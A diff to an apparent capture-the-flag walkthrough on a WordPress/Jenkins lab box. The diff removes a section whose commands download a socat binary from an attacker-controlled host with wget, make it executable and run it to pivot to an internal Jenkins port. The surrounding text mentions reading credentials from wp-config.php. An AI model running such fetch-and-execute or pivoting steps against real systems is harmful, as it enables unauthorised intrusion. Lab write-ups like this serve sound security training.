@@ -295,7 +295,7 @@ MySQL credentials can often be found by inspecting the `wp-config.php` file. Ala
 
 Explore to find an interesting file in the `/opt` directory. Read it.
 
-    $ su aubreanna
+    su aubreanna
 
 The user flag is in aubreanna’s home folder. 
 
@@ -320,29 +320,6 @@ $ nmap -sC -sV -p 1234 127.0.0.1
 ```
 
 Jenkins is now available on `127.0.0.1:1234/login?from=%2F` from the attack machine.
-
-## Using socat to redirect ports
-
-As an alternative we can use `socat`. It is not available on the target, we have to transfer it. On the attack machine:
-
-```text
-$ which socat 
-/usr/bin/socat
-$ cd /usr/bin/
-$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-
-On the target machine:
-
-```text
-$ cd /tmp/
-:/tmp$ wget http://<IP attack machine>:8000/socat
-:/tmp$ chmod +x socat
-:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
-```
-
-Jenkins is now available with `IP target:8888/login?from=%2F` from the attack machine.
 
 ## Jenkins' admin password
 
